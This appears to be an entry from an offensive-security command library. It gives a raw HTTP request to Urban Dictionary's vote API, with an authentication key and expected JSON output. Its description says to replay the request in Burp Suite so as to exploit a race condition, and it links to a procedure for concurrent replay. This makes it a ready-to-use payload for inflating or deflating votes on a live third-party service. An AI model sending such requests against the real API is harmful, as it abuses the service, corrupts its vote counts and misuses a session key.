---
data: >-
  GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee
  HTTP/1.1

  Host: api.urbandictionary.com

  Cache-Control: max-age=0

  Accept: application/json, text/javascript, */*; q=0.01

  Origin: http://www.urbandictionary.com/

  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
  like Gecko) Chrome/53.0.2785.116 Safari/537.36

  Referer: http://www.urbandictionary.com/define.php?term=alicia

  Accept-Encoding: gzip, deflate, sdch

  Accept-Language: en-US,en;q=0.8

  Connection: close
tags:
  - api
  - vote
  - race-condition
type: command
output: '{"status":"saved","up":6429,"down":1798}'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:22.709Z'
id: f45a6461-ccab-4bd7-b63a-e9b085d50611
verified: false
validated: true
submitted: true
---
# urbandictionary-vote-get

## Command

```http
GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
Host: api.urbandictionary.com
Cache-Control: max-age=0
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://www.urbandictionary.com/
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Referer: http://www.urbandictionary.com/define.php?term=alicia
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
Connection: close
```

## Description

Sends a vote request to Urban Dictionary's API to upvote a specific definition. Use in tools like Burp Suite for replay to exploit race conditions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| defid | ID of the definition being voted on | Yes |
| direction | Vote type: 'up' or 'down' | Yes |
| key | Session or user-specific authentication key | Yes |
| Host | API host: api.urbandictionary.com | Yes |
| User-Agent | Browser identifier | No |
| Referer | Source page URL | No |

## Examples

### Basic Usage

```http
GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
Host: api.urbandictionary.com
```

### Advanced Usage

Change direction to down:

```http
GET /v0/vote?defid=3889203&direction=down&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
Host: api.urbandictionary.com
```

## Expected Output

JSON response indicating vote saved and updated counts, e.g., {"status":"saved","up":6429,"down":1798}. Multiple executions may increment counts if race condition is present.

## Related

- [[Related Procedure: Replay-Vote-Request-Concurrently-with-Burp-Intruder]]
